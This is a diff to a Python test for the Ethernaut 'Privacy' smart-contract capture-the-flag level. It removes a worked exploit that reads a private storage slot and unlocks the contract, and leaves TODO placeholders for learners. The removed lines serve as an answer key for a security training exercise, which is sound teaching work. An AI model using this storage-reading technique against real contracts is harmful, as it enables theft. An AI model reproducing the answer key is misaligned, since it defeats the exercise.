@@ -1,7 +1,7 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv12_privacy import Privacy
-
+# TODO You can import your our own smart contract(s) here.
 
 @default_chain.connect()
 def test_lv12():
@@ -11,13 +11,7 @@ def test_lv12():
     ethernaut.check_lv12(contract)
 
 def exploit_lv12(contract: Privacy):
-    # Attack vector: blockchain is public, no data can be hidden
-    # Training: learn how storage layout works and how you can explore it using the testing framework
-    # wake print storage-layout contracts/lv12_privacy.sol
-    
-    # read from storage data[2]
-    stored_data_2: bytes = read_storage_variable(Account(contract.address), "data", keys=[2])
-
-    # extract first 16 bytes of data[2] => bytes16(data[2])
-    unlock_key = stored_data_2[0:16]
-    contract.unlock(unlock_key)
+    # TODO Unlock the contract.
+    # TODO You can import your our own smart contract(s) here.
+    # TODO Code here ...
+    pass
